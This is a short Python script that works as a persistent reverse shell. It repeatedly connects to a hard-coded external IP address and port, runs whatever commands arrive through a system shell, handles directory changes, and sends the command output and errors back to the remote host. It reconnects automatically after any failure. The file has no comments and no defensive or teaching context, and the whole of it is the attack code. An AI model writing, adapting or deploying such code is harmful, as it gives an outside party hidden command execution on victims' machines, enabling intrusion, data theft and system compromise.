import socket
import os
import subprocess
import time


def send_connection_request(socket,host, port):

    host = host
    port = port    

    while(True):
        
        try:
            socket.connect((host,port))
            print("Estabilished")
            break
        except:
            print("Attempting")





s = socket.socket()

send_connection_request(s,"157.45.221.40",64063)

while(True):
    try:
        data = s.recv(1024)

        if(data[:2].decode("utf-8")=="cd"):
            os.chdir(data[3:].decode("utf-8"))
            s.send(str.encode(os.getcwd() + ">"))
        elif (len(data)>0):

            cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

            input_byte = cmd.stdin
            output_byte = cmd.stdout.read()
            err_byte = cmd.stderr.read()

            input_str = str(data,"utf-8")
            output_str = str(output_byte, "utf-8")
            err_str = str(err_byte, "utf-8")
            currentWD = os.getcwd() + ">"


            print(currentWD+data.decode("utf-8"))
            print(output_str)
            print(err_str)
            print(currentWD)

            s.send(str.encode(output_str+"\n"+err_str+"\n\n"+currentWD))

            print("\n\n")
    except:
        #time.sleep(3)
        s.close()
        s=socket.socket()
        send_connection_request(s,"157.45.221.40",64063)
